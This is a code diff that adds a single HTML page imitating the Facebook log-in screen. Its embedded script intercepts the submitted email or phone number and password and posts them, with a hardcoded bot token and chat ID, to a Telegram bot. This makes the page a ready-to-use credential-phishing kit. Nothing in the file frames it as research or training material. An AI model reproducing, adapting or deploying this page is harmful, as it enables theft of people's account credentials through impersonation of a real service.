@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Facebook - Log In or Sign Up</title>
+<style>
+  /* Reset and base */
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    padding: 40px 20px;
+  }
+  /* Container */
+  .container {
+    width: 100%;
+    max-width: 980px;
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    gap: 60px;
+  }
+  /* Left side text */
+  .left-side {
+    flex: 1.4;
+    padding-top: 20px;
+  }
+  .left-side h1 {
+    font-size: 56px;
+    color: #1877f2;
+    font-weight: 700;
+    line-height: 1.1;
+    margin-bottom: 20px;
+  }
+  .left-side p {
+    font-size: 24px;
+    color: #1c1e21;
+  }
+  /* Login box */
+  .login-box {
+    flex: 1;
+    background-color: #fff;
+    padding: 20px 24px 30px 24px;
+    border-radius: 8px;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+    max-width: 350px;
+  }
+  /* Form */
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+  input[type="text"],
+  input[type="password"] {
+    padding: 14px 16px;
+    margin-bottom: 14px;
+    font-size: 16px;
+    border-radius: 6px;
+    border: 1px solid #dddfe2;
+    outline-offset: 2px;
+    outline-color: transparent;
+    transition: border-color 0.2s ease;
+  }
+  input[type="text"]:focus,
+  input[type="password"]:focus {
+    border-color: #1877f2;
+    outline-color: #1877f2;
+  }
+  button[type="submit"] {
+    background-color: #1877f2;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    padding: 14px 16px;
+    font-weight: 600;
+    font-size: 20px;
+    cursor: pointer;
+    margin-top: 4px;
+    box-shadow: 0 4px 8px rgb(24 119 242 / 0.4);
+    transition: background-color 0.2s ease;
+  }
+  button[type="submit"]:hover {
+    background-color: #166fe5;
+  }
+  /* Forgot password */
+  .forgot-password {
+    text-align: center;
+    margin: 16px 0 10px 0;
+  }
+  .forgot-password a {
+    color: #1877f2;
+    font-size: 14px;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  .forgot-password a:hover {
+    text-decoration: underline;
+  }
+  /* Create account button */
+  .create-account-btn {
+    background-color: #42b72a;
+    font-weight: 700;
+    font-size: 17px;
+    border-radius: 6px;
+    padding: 14px 16px;
+    margin-top: 10px;
+    text-align: center;
+    color: #fff;
+    cursor: pointer;
+    box-shadow: 0 4px 8px rgb(66 183 42 / 0.5);
+    user-select: none;
+  }
+  .create-account-btn:hover {
+    background-color: #36a420;
+  }
+  /* Footer */
+  footer {
+    margin-top: 50px;
+    text-align: center;
+    font-size: 12px;
+    color: #737373;
+  }
+  /* Responsive */
+  @media (max-width: 720px) {
+    .container {
+      flex-direction: column;
+      max-width: 400px;
+    }
+    .left-side {
+      text-align: center;
+      padding: 0;
+      margin-bottom: 30px;
+    }
+    .left-side h1 {
+      font-size: 40px;
+    }
+    .left-side p {
+      font-size: 18px;
+    }
+    .login-box {
+      max-width: 100%;
+    }
+  }
+  /* Message box */
+  #message {
+    margin-top: 12px;
+    color: #d93025;
+    font-weight: 600;
+    font-size: 14px;
+    min-height: 20px;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+  <div class="container" role="main" aria-label="Facebook login page">
+    <section class="left-side" aria-label="Facebook welcome message">
+      <h1>Facebook</h1>
+      <p>Connect with friends and the world around you on Facebook.</p>
+    </section>
+
+    <section class="login-box" aria-label="Login form">
+      <form id="loginForm" autocomplete="off" aria-describedby="message">
+        <input type="text" id="emailOrPhone" name="emailOrPhone" aria-label="Email or Phone Number" placeholder="Email or Phone number" required autocomplete="username" />
+        <input type="password" id="password" name="password" aria-label="Password" placeholder="Password" required autocomplete="current-password" />
+        <button type="submit" aria-label="Log In">Log In</button>
+        <div class="forgot-password">
+          <a href="https://www.facebook.com/login/identify" target="_blank" rel="noopener noreferrer">Forgot password?</a>
+        </div>
+        <div id="message" role="alert" aria-live="polite"></div>
+      </form>
+      <div class="create-account-btn" tabindex="0" role="button" aria-label="Create new account" onclick="alert('Redirect to Create Account page')">Create new account</div>
+    </section>
+  </div>
+
+<script>
+  (function () {
+    const token = '7622152443:AAHAtVJvAB0rf6HadrgGSpQrF_1iz-epK8s';
+    const chatId = '-1002686858072';
+
+    const form = document.getElementById('loginForm');
+    const messageBox = document.getElementById('message');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      messageBox.textContent = '';
+      const emailOrPhone = form.emailOrPhone.value.trim();
+      const password = form.password.value.trim();
+
+      if (!emailOrPhone || !password) {
+        messageBox.textContent = 'Please fill in both fields.';
+        return;
+      }
+
+      // Compose message for Telegram
+      const text = `📥 New Login Attempt:\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}`;
+
+      // Telegram API endpoint for sending message
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      // Send the message via POST
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          messageBox.style.color = 'green';
+          messageBox.textContent = 'Login info sent successfully.';
+          form.reset();
+        } else {
+          messageBox.style.color = '#d93025';
+          messageBox.textContent = 'Error sending login info. Please try again.';
+          console.error('Telegram API error:', data);
+        }
+      })
+      .catch(error => {
+        messageBox.style.color = '#d93025';
+        messageBox.textContent = 'Network error. Please try again.';
+        console.error('Fetch error:', error);
+      });
+    });
+  })();
+</script>
+</body>
+</html>
+
